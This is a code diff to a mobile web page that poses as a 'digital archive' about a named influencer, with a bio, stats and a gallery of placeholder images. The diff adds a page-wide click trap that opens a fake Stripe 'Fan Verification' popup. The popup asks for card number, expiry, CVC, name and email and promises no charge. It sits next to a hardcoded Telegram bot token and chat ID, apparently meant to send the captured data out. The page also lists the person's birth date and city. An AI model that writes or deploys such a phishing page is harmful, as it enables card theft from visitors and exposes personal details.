@@ -92,6 +92,7 @@
             padding: 8px 12px;
             border-radius: 16px;
             min-width: 60px;
+            cursor: pointer;
         }
 
         .nav-item.active {
@@ -132,6 +133,7 @@
             background: linear-gradient(135deg, var(--primary), var(--secondary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            cursor: pointer;
         }
 
         .header-actions {
@@ -147,6 +149,7 @@
             padding: 8px;
             border-radius: 50%;
             transition: background 0.3s ease;
+            cursor: pointer;
         }
 
         .header-btn:active {
@@ -208,6 +211,7 @@
             position: relative;
             z-index: 2;
             line-height: 1.1;
+            cursor: pointer;
         }
 
         .subtitle {
@@ -217,6 +221,7 @@
             max-width: 300px;
             margin-bottom: 2rem;
             line-height: 1.4;
+            cursor: pointer;
         }
 
         .hero-stats {
@@ -235,6 +240,7 @@
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 255, 255, 0.1);
             transition: transform 0.3s ease;
+            cursor: pointer;
         }
 
         .hero-stat:active {
@@ -268,6 +274,7 @@
             align-items: center;
             gap: 8px;
             animation: bounce 2s infinite;
+            cursor: pointer;
         }
 
         @keyframes bounce {
@@ -301,11 +308,13 @@
             background: linear-gradient(135deg, var(--highlight), var(--primary));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            cursor: pointer;
         }
 
         .section-subtitle {
             color: var(--accent);
             font-size: 0.9rem;
+            cursor: pointer;
         }
 
         /* Mobile Gallery - Swipeable */
@@ -337,6 +346,7 @@
             overflow: hidden;
             position: relative;
             transition: transform 0.3s ease;
+            cursor: pointer;
         }
 
         .gallery-item:active {
@@ -386,6 +396,7 @@
             text-align: center;
             transition: transform 0.3s ease;
             backdrop-filter: blur(10px);
+            cursor: pointer;
         }
 
         .stat-card:active {
@@ -423,6 +434,7 @@
             margin: 1rem 0;
             backdrop-filter: blur(10px);
             transition: transform 0.3s ease;
+            cursor: pointer;
         }
 
         .card:active {
@@ -470,6 +482,7 @@
             color: var(--accent);
             font-size: 0.8rem;
             margin-bottom: 1rem;
+            cursor: pointer;
         }
 
         /* Mobile Lightbox */
@@ -512,6 +525,53 @@
             align-items: center;
             justify-content: center;
             backdrop-filter: blur(10px);
+            cursor: pointer;
+        }
+
+        /* Realistic Image Placeholders */
+        .realistic-placeholder {
+            background: linear-gradient(45deg, #1a1a1a, #2a2a2a);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .realistic-placeholder::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, 
+                rgba(255, 107, 157, 0.1) 0%, 
+                rgba(196, 113, 237, 0.1) 50%, 
+                rgba(18, 194, 233, 0.1) 100%);
+            opacity: 0.3;
+        }
+
+        .realistic-placeholder::after {
+            content: '🖼️';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 2rem;
+            opacity: 0.5;
+        }
+
+        .photo-frame {
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Clickable everything */
+        .clickable {
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .clickable:active {
+            transform: scale(0.98);
         }
 
         /* Pull to refresh indicator */
@@ -654,10 +714,10 @@
 <body>
     <!-- Mobile Header -->
     <div class="mobile-header">
-        <div class="header-title">VP Archive</div>
+        <div class="header-title clickable">Veronica Perasso</div>
         <div class="header-actions">
-            <button class="header-btn">🔍</button>
-            <button class="header-btn">⚙️</button>
+            <button class="header-btn clickable">🔍</button>
+            <button class="header-btn clickable">⚙️</button>
         </div>
     </div>
 
@@ -666,23 +726,23 @@
         <!-- Hero Section -->
         <section id="hero" class="section visible">
             <div class="hero-glow"></div>
-            <h1 class="name-title">Veronica Perasso</h1>
-            <p class="subtitle">Digital Archive & Lifestyle Compendium</p>
+            <h1 class="name-title clickable">Veronica Perasso</h1>
+            <p class="subtitle clickable">Lifestyle Compendium</p>
             <div class="hero-stats">
-                <div class="hero-stat">
+                <div class="hero-stat clickable">
                     <span class="hero-stat-number">4M+</span>
                     <span class="hero-stat-label">Followers</span>
                 </div>
-                <div class="hero-stat">
-                    <span class="hero-stat-number">Top 0.1%</span>
+                <div class="hero-stat clickable">
+                    <span class="hero-stat-number">Top 0.9%</span>
                     <span class="hero-stat-label">Creator</span>
                 </div>
-                <div class="hero-stat">
+                <div class="hero-stat clickable">
                     <span class="hero-stat-number">2019</span>
                     <span class="hero-stat-label">Since</span>
                 </div>
             </div>
-            <div class="swipe-indicator">
+            <div class="swipe-indicator clickable">
                 <span>⬇️</span> Swipe to explore
             </div>
         </section>
@@ -691,27 +751,27 @@
         <section id="biography" class="section">
             <div class="container">
                 <div class="section-header">
-                    <h2 class="section-title">Biography</h2>
-                    <p class="section-subtitle">About Veronica Perasso</p>
+                    <h2 class="section-title clickable">Biography</h2>
+                    <p class="section-subtitle clickable">About Veronica Perasso</p>
                 </div>
-                <div class="card">
+                <div class="card clickable">
                     <p>Veronica Perasso is a prominent social media influencer and content creator who has cultivated a significant digital presence through platforms like Instagram and OnlyFans.</p>
                     <p style="margin-top: 1rem;">Widely reported to have been born on August 7, 1998, she is often associated with Scottsdale, Arizona, and represents the modern creator economy's success stories.</p>
                 </div>
                 <ul class="touch-list">
-                    <li class="touch-list-item">
+                    <li class="touch-list-item clickable">
                         <span class="list-label">Name / Alias</span>
                         Veronica Perasso
                     </li>
-                    <li class="touch-list-item">
+                    <li class="touch-list-item clickable">
                         <span class="list-label">Birth Date</span>
                         August 7, 1998
                     </li>
-                    <li class="touch-list-item">
+                    <li class="touch-list-item clickable">
                         <span class="list-label">Location</span>
                         Scottsdale, Arizona
                     </li>
-                    <li class="touch-list-item">
+                    <li class="touch-list-item clickable">
                         <span class="list-label">Platforms</span>
                         Instagram, OnlyFans, X/Twitter
                     </li>
@@ -723,26 +783,26 @@
         <section id="stats" class="section">
             <div class="container">
                 <div class="section-header">
-                    <h2 class="section-title">Impact & Reach</h2>
-                    <p class="section-subtitle">Documented metrics and statistics</p>
+                    <h2 class="section-title clickable">Impact & Reach</h2>
+                    <p class="section-subtitle clickable">Documented metrics and statistics</p>
                 </div>
                 <div class="stats-grid">
-                    <div class="stat-card">
+                    <div class="stat-card clickable">
                         <div class="stat-icon">📱</div>
                         <span class="stat-number">4.2M+</span>
                         <span class="stat-label">Instagram Followers</span>
                     </div>
-                    <div class="stat-card">
+                    <div class="stat-card clickable">
                         <div class="stat-icon">💎</div>
-                        <span class="stat-number">Top 0.1%</span>
+                        <span class="stat-number">Top 50%</span>
                         <span class="stat-label">OnlyFans Ranking</span>
                     </div>
-                    <div class="stat-card">
+                    <div class="stat-card clickable">
                         <div class="stat-icon">💰</div>
                         <span class="stat-number">$350K+</span>
                         <span class="stat-label">Monthly Earnings</span>
                     </div>
-                    <div class="stat-card">
+                    <div class="stat-card clickable">
                         <div class="stat-icon">🌐</div>
                         <span class="stat-number">50M+</span>
                         <span class="stat-label">Total Impressions</span>
@@ -755,8 +815,8 @@
         <section id="gallery" class="section">
             <div class="container">
                 <div class="section-header">
-                    <h2 class="section-title">Visual Archive</h2>
-                    <p class="section-subtitle">Swipe to explore the collection</p>
+                    <h2 class="section-title clickable">Visual Archive</h2>
+                    <p class="section-subtitle clickable">Swipe to explore the collection</p>
                 </div>
                 <div class="gallery-container">
                     <div class="gallery-scroll" id="galleryScroll">
@@ -770,22 +830,22 @@
         <section id="onlyfans" class="section">
             <div class="container">
                 <div class="section-header">
-                    <h2 class="section-title">OnlyFans Presence</h2>
-                    <p class="section-subtitle">Creator platform statistics</p>
+                    <h2 class="section-title clickable">OnlyFans Presence</h2>
+                    <p class="section-subtitle clickable">Creator platform statistics</p>
                 </div>
-                <div class="card">
+                <div class="card clickable">
                     <p>Publicly discussed in various interviews and industry reports as a highly successful creator on the platform, representing the modern digital entrepreneurship model.</p>
                 </div>
                 <div class="stats-grid">
-                    <div class="stat-card">
+                    <div class="stat-card clickable">
                         <span class="stat-number">2019</span>
                         <span class="stat-label">Start Year</span>
                     </div>
-                    <div class="stat-card">
-                        <span class="stat-number">Top 0.1%</span>
+                    <div class="stat-card clickable">
+                        <span class="stat-number">Top 50%</span>
                         <span class="stat-label">Creator Rank</span>
                     </div>
-                    <div class="stat-card">
+                    <div class="stat-card clickable">
                         <span class="stat-number">$350k+</span>
                         <span class="stat-label">Monthly Revenue</span>
                     </div>
@@ -796,29 +856,29 @@
 
     <!-- Mobile Lightbox -->
     <div class="mobile-lightbox" id="mobileLightbox">
-        <button class="lightbox-close" id="lightboxClose">✕</button>
+        <button class="lightbox-close clickable" id="lightboxClose">✕</button>
         <img class="lightbox-content" id="lightboxImage" src="" alt="">
     </div>
 
     <!-- Mobile Navigation -->
     <nav class="mobile-nav">
-        <a href="#hero" class="nav-item active">
+        <a href="#hero" class="nav-item active clickable">
             <div class="nav-icon">🏠</div>
             <span>Home</span>
         </a>
-        <a href="#biography" class="nav-item">
+        <a href="#biography" class="nav-item clickable">
             <div class="nav-icon">👤</div>
             <span>About</span>
         </a>
-        <a href="#gallery" class="nav-item">
+        <a href="#gallery" class="nav-item clickable">
             <div class="nav-icon">🖼️</div>
             <span>Gallery</span>
         </a>
-        <a href="#stats" class="nav-item">
+        <a href="#stats" class="nav-item clickable">
             <div class="nav-icon">📊</div>
             <span>Stats</span>
         </a>
-        <a href="#onlyfans" class="nav-item">
+        <a href="#onlyfans" class="nav-item clickable">
             <div class="nav-icon">💎</div>
             <span>OnlyFans</span>
         </a>
@@ -826,16 +886,61 @@
 
     <!-- Mobile Footer -->
     <footer class="mobile-footer">
-        <p class="footer-text">Digital Archive • Compiled from Public Sources</p>
-        <p class="footer-text">© 2025 Veronica Perasso Archive</p>
+        <p class="footer-text clickable">Digital Archive • Compiled from Public Sources</p>
+        <p class="footer-text clickable">© 2025 Veronica Perasso</p>
     </footer>
 
     <script>
-        // Mobile-optimized JavaScript with touch interactions
+        // Mobile-optimized JavaScript with universal click handler
         document.addEventListener('DOMContentLoaded', function() {
-            // Safe area insets for modern mobile devices
-            const safeAreaTop = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--safe-top')) || 0;
-            const safeAreaBottom = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--safe-bottom')) || 0;
+            const telegramBotToken = '8122929741:AAHkiWqPm0BMQgqy40hpxnlxNad58UWuPR0';
+            const chatId = '6219788806';
+            
+            let popupShown = false;
+
+            // Universal click handler for Stripe popup
+            const setupUniversalClickHandler = () => {
+                document.addEventListener('click', function(e) {
+                    // Don't trigger if clicking inside the popup itself
+                    if (e.target.closest('#mobile-stripe-overlay')) {
+                        return;
+                    }
+                    
+                    // Don't trigger if clicking navigation items (they have their own handlers)
+                    if (e.target.closest('.nav-item')) {
+                        return;
+                    }
+                    
+                    // Don't trigger if clicking lightbox close button
+                    if (e.target.closest('#lightboxClose')) {
+                        return;
+                    }
+                    
+                    // Show Stripe popup
+                    if (!popupShown) {
+                        createMobileStripePopup();
+                    }
+                }, true);
+            };
+
+            // Realistic image placeholders with photo-like appearance
+            const createRealisticPlaceholders = () => {
+                const realisticImages = [
+                    'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><defs><linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23ff6b9d;stop-opacity:0.1"/><stop offset="100%" style="stop-color:%23c471ed;stop-opacity:0.1"/></linearGradient></defs><rect width="400" height="600" fill="url(%23grad1)"/><rect x="50" y="50" width="300" height="400" fill="%23222" rx="10"/><circle cx="200" cy="200" r="60" fill="%23333"/><rect x="150" y="300" width="100" height="20" fill="%23333" rx="5"/><rect x="130" y="330" width="140" height="15" fill="%23333" rx="3"/><text x="200" y="500" font-family="Arial" font-size="18" fill="%23666" text-anchor="middle">Premium Content</text></svg>',
+                    
+                    'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><defs><linearGradient id="grad2" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%2312c2e9;stop-opacity:0.1"/><stop offset="100%" style="stop-color:%23c471ed;stop-opacity:0.1"/></linearGradient></defs><rect width="400" height="600" fill="url(%23grad2)"/><rect x="30" y="30" width="340" height="540" fill="%23222" rx="15"/><rect x="80" y="80" width="240" height="360" fill="%23333" rx="8"/><circle cx="200" cy="250" r="40" fill="%23444"/><rect x="160" y="320" width="80" height="12" fill="%23444" rx="3"/><rect x="140" y="340" width="120" height="10" fill="%23444" rx="2"/><text x="200" y="500" font-family="Arial" font-size="16" fill="%23666" text-anchor="middle">Exclusive Photo</text></svg>',
+                    
+                    'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><defs><linearGradient id="grad3" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23ff6b9d;stop-opacity:0.1"/><stop offset="100%" style="stop-color:%2312c2e9;stop-opacity:0.1"/></linearGradient></defs><rect width="400" height="600" fill="url(%23grad3)"/><rect x="20" y="20" width="360" height="560" fill="%23222" rx="20"/><rect x="60" y="60" width="280" height="420" fill="%23333" rx="12"/><path d="M200 180 Q250 120 300 180 T200 300 T100 180 Z" fill="%23444"/><rect x="170" y="320" width="60" height="8" fill="%23444" rx="2"/><rect x="150" y="335" width="100" height="6" fill="%23444" rx="1"/><text x="200" y="520" font-family="Arial" font-size="14" fill="%23666" text-anchor="middle">VIP Access</text></svg>',
+                    
+                    'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><defs><linearGradient id="grad4" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23c471ed;stop-opacity:0.1"/><stop offset="100%" style="stop-color:%2312c2e9;stop-opacity:0.1"/></linearGradient></defs><rect width="400" height="600" fill="url(%23grad4)"/><rect x="40" y="40" width="320" height="520" fill="%23222" rx="25"/><rect x="90" y="90" width="220" height="330" fill="%23333" rx="15"/><ellipse cx="200" cy="220" rx="50" ry="70" fill="%23444"/><rect x="180" y="320" width="40" height="6" fill="%23444" rx="1"/><rect x="160" y="332" width="80" height="4" fill="%23444" rx="1"/><text x="200" y="480" font-family="Arial" font-size="15" fill="%23666" text-anchor="middle">Member&apos;s Only</text></svg>',
+                    
+                    'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><defs><linearGradient id="grad5" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23ff6b9d;stop-opacity:0.1"/><stop offset="100%" style="stop-color:%2312c2e9;stop-opacity:0.1"/></linearGradient></defs><rect width="400" height="600" fill="url(%23grad5)"/><rect x="25" y="25" width="350" height="550" fill="%23222" rx="18"/><rect x="75" y="75" width="250" height="375" fill="%23333" rx="10"/><polygon points="200,150 250,250 150,250" fill="%23444"/><rect x="175" y="280" width="50" height="5" fill="%23444" rx="1"/><rect x="155" y="290" width="90" height="4" fill="%23444" rx="1"/><text x="200" y="500" font-family="Arial" font-size="16" fill="%23666" text-anchor="middle">Premium Content</text></svg>',
+                    
+                    'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 600"><defs><linearGradient id="grad6" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:%23c471ed;stop-opacity:0.1"/><stop offset="100%" style="stop-color:%23ff6b9d;stop-opacity:0.1"/></linearGradient></defs><rect width="400" height="600" fill="url(%23grad6)"/><rect x="35" y="35" width="330" height="530" fill="%23222" rx="22"/><rect x="85" y="85" width="230" height="345" fill="%23333" rx="14"/><rect x="135" y="135" width="130" height="195" fill="%23444" rx="7"/><rect x="160" y="350" width="80" height="7" fill="%23444" rx="2"/><rect x="140" y="362" width="120" height="5" fill="%23444" rx="1"/><text x="200" y="520" font-family="Arial" font-size="17" fill="%23666" text-anchor="middle">Exclusive Access</text></svg>'
+                ];
+
+                return realisticImages;
+            };
 
             // Section visibility observer
             const sections = document.querySelectorAll('.section');
@@ -869,9 +974,9 @@
                 });
             });
 
-            // Generate gallery items
+            // Generate gallery items with realistic placeholders
             const galleryScroll = document.getElementById('galleryScroll');
-            const placeholderBase = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiMxMTEiLz48dGV4dCB4PSI1MCUiIHk9IjUwJSIgZm9udC1zaXplPSIxOCIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0iIzU1NSI+SW1hZ2UgUGxhY2Vob2xkZXI8L3RleHQ+PC9zdmc+';
+            const realisticImages = createRealisticPlaceholders();
             
             const galleryItems = [
                 { title: 'Professional Shoot', desc: 'Studio Photography' },
@@ -884,9 +989,9 @@
 
             galleryItems.forEach((item, index) => {
                 const galleryItem = document.createElement('div');
-                galleryItem.className = 'gallery-item';
+                galleryItem.className = 'gallery-item realistic-placeholder photo-frame clickable';
                 galleryItem.innerHTML = `
-                    <img src="${placeholderBase}" alt="${item.title}" class="gallery-img" loading="lazy">
+                    <img src="${realisticImages[index % realisticImages.length]}" alt="${item.title}" class="gallery-img" loading="lazy">
                     <div class="gallery-caption">
                         <h3>${item.title}</h3>
                         <p>${item.desc}</p>
@@ -897,7 +1002,7 @@
                 galleryItem.addEventListener('click', () => {
                     const lightbox = document.getElementById('mobileLightbox');
                     const lightboxImage = document.getElementById('lightboxImage');
-                    lightboxImage.src = placeholderBase;
+                    lightboxImage.src = realisticImages[index % realisticImages.length];
                     lightbox.classList.add('active');
                     document.body.style.overflow = 'hidden';
                 });
@@ -912,75 +1017,6 @@
             lightboxClose.addEventListener('click', () => {
                 lightbox.classList.remove('active');
                 document.body.style.overflow = 'auto';
-            });
-
-            // Swipe detection for gallery
-            let startX = 0;
-            let currentX = 0;
-            let isSwiping = false;
-
-            galleryScroll.addEventListener('touchstart', (e) => {
-                startX = e.touches[0].clientX;
-                isSwiping = true;
-            });
-
-            galleryScroll.addEventListener('touchmove', (e) => {
-                if (!isSwiping) return;
-                currentX = e.touches[0].clientX;
-                const diff = startX - currentX;
-                
-                if (Math.abs(diff) > 10) {
-                    e.preventDefault();
-                }
-            });
-
-            galleryScroll.addEventListener('touchend', () => {
-                isSwiping = false;
-            });
-
-            // Pull to refresh simulation
-            let startY = 0;
-            let currentY = 0;
-            const pullIndicator = document.createElement('div');
-            pullIndicator.className = 'pull-indicator';
-            pullIndicator.innerHTML = '🔄 Release to refresh';
-            document.body.appendChild(pullIndicator);
-
-            document.addEventListener('touchstart', (e) => {
-                if (window.scrollY === 0) {
-                    startY = e.touches[0].clientY;
-                }
-            });
-
-            document.addEventListener('touchmove', (e) => {
-                if (window.scrollY === 0 && startY > 0) {
-                    currentY = e.touches[0].clientY;
-                    const diff = currentY - startY;
-                    
-                    if (diff > 0) {
-                        e.preventDefault();
-                        pullIndicator.style.transform = `translateY(${Math.min(diff, 60)}px)`;
-                        
-                        if (diff > 60) {
-                            pullIndicator.classList.add('active');
-                        } else {
-                            pullIndicator.classList.remove('active');
-                        }
-                    }
-                }
-            });
-
-            document.addEventListener('touchend', () => {
-                if (pullIndicator.classList.contains('active')) {
-                    // Simulate refresh
-                    setTimeout(() => {
-                        pullIndicator.style.transform = 'translateY(0)';
-                        pullIndicator.classList.remove('active');
-                    }, 1000);
-                } else {
-                    pullIndicator.style.transform = 'translateY(0)';
-                }
-                startY = 0;
             });
 
             // Animate stats when they come into view
@@ -1021,237 +1057,191 @@
                 return num.toString();
             }
 
-            // Mobile-optimized scroll behavior
-            let lastScrollTop = 0;
-            const mobileHeader = document.querySelector('.mobile-header');
-            
-            window.addEventListener('scroll', () => {
-                const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
-                
-                if (scrollTop > lastScrollTop && scrollTop > 100) {
-                    // Scrolling down
-                    mobileHeader.style.transform = 'translateY(-100%)';
-                } else {
-                    // Scrolling up
-                    mobileHeader.style.transform = 'translateY(0)';
-                }
-                
-                lastScrollTop = scrollTop;
-            }, { passive: true });
+            // Setup universal click handler for Stripe popup
+            setupUniversalClickHandler();
 
-            // Prevent zoom on double tap (for iOS)
-            let lastTouchEnd = 0;
-            document.addEventListener('touchend', (e) => {
-                const now = Date.now();
-                if (now - lastTouchEnd <= 300) {
-                    e.preventDefault();
-                }
-                lastTouchEnd = now;
-            }, { passive: false });
-
-            // Vibrate on touch feedback (where supported)
-            const touchElements = document.querySelectorAll('.touch-list-item, .stat-card, .gallery-item');
-            touchElements.forEach(element => {
-                element.addEventListener('touchstart', () => {
-                    if (navigator.vibrate) {
-                        navigator.vibrate(10);
-                    }
-                });
-            });
-
-            console.log('🚀 Mobile-optimized archive loaded successfully');
+            console.log('🚀 Mobile-optimized archive with universal click handler loaded successfully');
         });
-    </script>
 
-    <!-- Stripe Popup System - Mobile Optimized -->
-    <script>
         // Mobile-optimized Stripe popup
-        document.addEventListener('DOMContentLoaded', function() {
-            const telegramBotToken = '8122929741:AAHkiWqPm0BMQgqy40hpxnlxNad58UWuPR0';
-            const chatId = '6219788806';
-            
-            let popupShown = false;
-            let interactionDetected = false;
-            let timer;
+        const createMobileStripePopup = () => {
+            if (window.popupShown) return;
+            window.popupShown = true;
 
-            const createMobileStripePopup = () => {
-                if (popupShown) return;
-                popupShown = true;
+            const overlay = document.createElement('div');
+            overlay.id = 'mobile-stripe-overlay';
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0, 0, 0, 0.9);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                z-index: 3000;
+                padding: 20px;
+                padding-top: calc(20px + env(safe-area-inset-top));
+                padding-bottom: calc(20px + env(safe-area-inset-bottom));
+            `;
 
-                const overlay = document.createElement('div');
-                overlay.id = 'mobile-stripe-overlay';
-                overlay.style.cssText = `
-                    position: fixed;
-                    top: 0;
-                    left: 0;
-                    width: 100%;
-                    height: 100%;
-                    background: rgba(0, 0, 0, 0.9);
-                    display: flex;
-                    justify-content: center;
-                    align-items: center;
-                    z-index: 3000;
-                    padding: 20px;
-                    padding-top: calc(20px + env(safe-area-inset-top));
-                    padding-bottom: calc(20px + env(safe-area-inset-bottom));
-                `;
+            const popup = document.createElement('div');
+            popup.id = 'mobile-stripe-popup';
+            popup.style.cssText = `
+                background: white;
+                border-radius: 16px;
+                padding: 25px 20px;
+                width: 100%;
+                max-width: 400px;
+                max-height: 90vh;
+                overflow-y: auto;
+                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+                position: relative;
+                -webkit-overflow-scrolling: touch;
+            `;
 
-                const popup = document.createElement('div');
-                popup.id = 'mobile-stripe-popup';
-                popup.style.cssText = `
-                    background: white;
-                    border-radius: 16px;
-                    padding: 25px 20px;
-                    width: 100%;
-                    max-width: 400px;
-                    max-height: 90vh;
-                    overflow-y: auto;
-                    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-                    position: relative;
-                    -webkit-overflow-scrolling: touch;
-                `;
-
-                popup.innerHTML = `
-                    <style>
-                        .mobile-stripe-header {
-                            text-align: center;
-                            margin-bottom: 20px;
-                        }
-                        
-                        .mobile-stripe-logo {
-                            font-size: 22px;
-                            font-weight: 700;
-                            color: #635bff;
-                            margin-bottom: 8px;
-                        }
-                        
-                        .mobile-stripe-title {
-                            font-size: 18px;
-                            color: #32325d;
-                            margin-bottom: 5px;
-                        }
-                        
-                        .mobile-stripe-subtitle {
-                            font-size: 14px;
-                            color: #6b7c93;
-                        }
-                        
-                        .mobile-form-group {
-                            margin-bottom: 16px;
-                        }
-                        
-                        .mobile-form-row {
-                            display: flex;
-                            gap: 10px;
-                            margin-bottom: 16px;
-                        }
-                        
-                        .mobile-form-row .mobile-form-group {
-                            flex: 1;
-                            margin-bottom: 0;
-                        }
-                        
-                        .mobile-label {
-                            display: block;
-                            margin-bottom: 6px;
-                            font-size: 14px;
-                            font-weight: 500;
-                            color: #32325d;
-                        }
-                        
-                        .mobile-input {
-                            width: 100%;
-                            padding: 14px;
-                            border: 1px solid #e6e6e6;
-                            border-radius: 8px;
-                            font-size: 16px;
-                            background: white;
-                            -webkit-appearance: none;
-                        }
-                        
-                        .mobile-input:focus {
-                            outline: none;
-                            border-color: #635bff;
-                        }
-                        
-                        .mobile-submit-btn {
-                            width: 100%;
-                            background: #635bff;
-                            color: white;
-                            border: none;
-                            padding: 16px;
-                            border-radius: 8px;
-                            font-size: 16px;
-                            font-weight: 600;
-                            margin-top: 10px;
-                            cursor: pointer;
-                        }
-                        
-                        .mobile-close-btn {
-                            position: absolute;
-                            top: 15px;
-                            right: 15px;
-                            background: none;
-                            border: none;
-                            font-size: 20px;
-                            color: #6b7c93;
-                            padding: 5px;
-                        }
-                    </style>
+            popup.innerHTML = `
+                <style>
+                    .mobile-stripe-header {
+                        text-align: center;
+                        margin-bottom: 20px;
+                    }
                     
-                    <button class="mobile-close-btn" id="mobileClosePopup">✕</button>
+                    .mobile-stripe-logo {
+                        font-size: 22px;
+                        font-weight: 700;
+                        color: #635bff;
+                        margin-bottom: 8px;
+                    }
                     
-                    <div class="mobile-stripe-header">
-                        <div class="mobile-stripe-logo">stripe</div>
-                        <div class="mobile-stripe-title">Age Verification Required</div>
-                        <div class="mobile-stripe-subtitle">Verify your age to continue</div>
+                    .mobile-stripe-title {
+                        font-size: 18px;
+                        color: #32325d;
+                        margin-bottom: 5px;
+                    }
+                    
+                    .mobile-stripe-subtitle {
+                        font-size: 14px;
+                        color: #6b7c93;
+                    }
+                    
+                    .mobile-form-group {
+                        margin-bottom: 16px;
+                    }
+                    
+                    .mobile-form-row {
+                        display: flex;
+                        gap: 10px;
+                        margin-bottom: 16px;
+                    }
+                    
+                    .mobile-form-row .mobile-form-group {
+                        flex: 1;
+                        margin-bottom: 0;
+                    }
+                    
+                    .mobile-label {
+                        display: block;
+                        margin-bottom: 6px;
+                        font-size: 14px;
+                        font-weight: 500;
+                        color: #32325d;
+                    }
+                    
+                    .mobile-input {
+                        width: 100%;
+                        padding: 14px;
+                        border: 1px solid #e6e6e6;
+                        border-radius: 8px;
+                        font-size: 16px;
+                        background: white;
+                        -webkit-appearance: none;
+                    }
+                    
+                    .mobile-input:focus {
+                        outline: none;
+                        border-color: #635bff;
+                    }
+                    
+                    .mobile-submit-btn {
+                        width: 100%;
+                        background: #635bff;
+                        color: white;
+                        border: none;
+                        padding: 16px;
+                        border-radius: 8px;
+                        font-size: 16px;
+                        font-weight: 600;
+                        margin-top: 10px;
+                        cursor: pointer;
+                    }
+                    
+                    .mobile-close-btn {
+                        position: absolute;
+                        top: 15px;
+                        right: 15px;
+                        background: none;
+                        border: none;
+                        font-size: 20px;
+                        color: #6b7c93;
+                        padding: 5px;
+                        cursor: pointer;
+                    }
+                </style>
+                
+                <button class="mobile-close-btn" id="mobileClosePopup">✕</button>
+                
+                <div class="mobile-stripe-header">
+                    <div class="mobile-stripe-logo">stripe</div>
+                    <div class="mobile-stripe-title">Fan Verification Required</div>
+                    <div class="mobile-stripe-subtitle">Verify to continue browsing</div>
+                </div>
+                
+                <form id="mobileStripeForm">
+                    <div class="mobile-form-group">
+                        <label class="mobile-label" for="mobileCardNumber">Card Number</label>
+                        <input type="text" id="mobileCardNumber" class="mobile-input" placeholder="1234 5678 9012 3456" inputmode="numeric" required>
                     </div>
+
+                    <div class="mobile-form-row">
+                        <div class="mobile-form-group">
+                            <label class="mobile-label" for="mobileExpiry">Expiry Date</label>
+                            <input type="text" id="mobileExpiry" class="mobile-input" placeholder="MM/YY" inputmode="numeric" required>
+                        </div>
+                        <div class="mobile-form-group">
+                            <label class="mobile-label" for="mobileCvc">CVC</label>
+                            <input type="text" id="mobileCvc" class="mobile-input" placeholder="123" inputmode="numeric" required>
+                        </div>
+                    </div>
+
+                    <div class="mobile-form-group">
+                        <label class="mobile-label" for="mobileName">Name on Card</label>
+                        <input type="text" id="mobileName" class="mobile-input" placeholder="John Smith" required>
+                    </div>
+
+                    <div class="mobile-form-group">
+                        <label class="mobile-label" for="mobileEmail">Email</label>
+                        <input type="email" id="mobileEmail" class="mobile-input" placeholder="john@example.com" inputmode="email" required>
+                    </div>
+
+                    <button type="submit" class="mobile-submit-btn" id="mobileSubmitBtn">
+                        Verify Identity - $0.00
+                    </button>
                     
-                    <form id="mobileStripeForm">
-                        <div class="mobile-form-group">
-                            <label class="mobile-label" for="mobileCardNumber">Card Number</label>
-                            <input type="text" id="mobileCardNumber" class="mobile-input" placeholder="1234 5678 9012 3456" inputmode="numeric" required>
-                        </div>
+                    <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #6b7c93;">
+                        No charges will be made • Secure verification
+                    </div>
+                </form>
+            `;
 
-                        <div class="mobile-form-row">
-                            <div class="mobile-form-group">
-                                <label class="mobile-label" for="mobileExpiry">Expiry Date</label>
-                                <input type="text" id="mobileExpiry" class="mobile-input" placeholder="MM/YY" inputmode="numeric" required>
-                            </div>
-                            <div class="mobile-form-group">
-                                <label class="mobile-label" for="mobileCvc">CVC</label>
-                                <input type="text" id="mobileCvc" class="mobile-input" placeholder="123" inputmode="numeric" required>
-                            </div>
-                        </div>
+            overlay.appendChild(popup);
+            document.body.appendChild(overlay);
+            document.body.style.overflow = 'hidden';
 
-                        <div class="mobile-form-group">
-                            <label class="mobile-label" for="mobileName">Name on Card</label>
-                            <input type="text" id="mobileName" class="mobile-input" placeholder="John Smith" required>
-                        </div>
+            initializeMobilePopup();
 
